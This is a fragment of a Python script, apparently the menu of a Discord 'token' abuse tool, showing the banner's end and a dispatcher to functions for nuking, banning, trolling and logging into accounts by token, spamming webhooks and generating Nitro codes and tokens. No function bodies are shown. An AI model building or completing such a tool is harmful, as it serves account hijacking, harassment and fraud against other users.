        {Fore.MAGENTA}(4){Fore.RESET}{Fore.WHITE} Troll token                            {Fore.MAGENTA}(12){Fore.RESET}{Fore.WHITE} Check webhook
        {Fore.MAGENTA}(5){Fore.RESET}{Fore.WHITE} Token informations                     {Fore.MAGENTA}(13){Fore.RESET}{Fore.WHITE} Generate nitro codes
        {Fore.MAGENTA}(6){Fore.RESET}{Fore.WHITE} Get token from user id                 {Fore.MAGENTA}(14){Fore.RESET}{Fore.WHITE} Generate tokens
        {Fore.MAGENTA}(7){Fore.RESET}{Fore.WHITE} Login on token                         {Fore.MAGENTA}(15){Fore.RESET}{Fore.WHITE} Informations & contact
        {Fore.MAGENTA}(8){Fore.RESET}{Fore.WHITE} Unverify token                         {Fore.MAGENTA}(0){Fore.RESET}{Fore.WHITE} Exit

    '''
    return banner

    

def mainMenu():
    print(getBanner())
    print(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Your choice', end=''); choice = str(input(': '))

    if choice == '1':
      tokenfetcher()

    elif choice == '2':
      nuketoken()

    elif choice == '3':
      bantoken()

    elif choice == '4':
      trolltoken()

    elif choice == '5':
      tokeninfo()

    elif choice == '6':
      tokenfromuserid()


    elif choice == '7':
      tokenlogin()

    elif choice == '8':
      unverifytoken()

    elif choice == '9':
      hypesquad()

    elif choice == '10':
      tokenvalidator()


    elif choice == '11':
      spamwebhook()

    elif choice == '12':

      checkwebhook()

    elif choice == '13':
      nitrogen()

    elif choice == '14':
      tokengen()

    elif choice == '0':
        exit()


    elif choice.isdigit() == False:
      mainMenu()

    else:
      mainMenu()   


if __name__ == '__main__':
    mainMenu()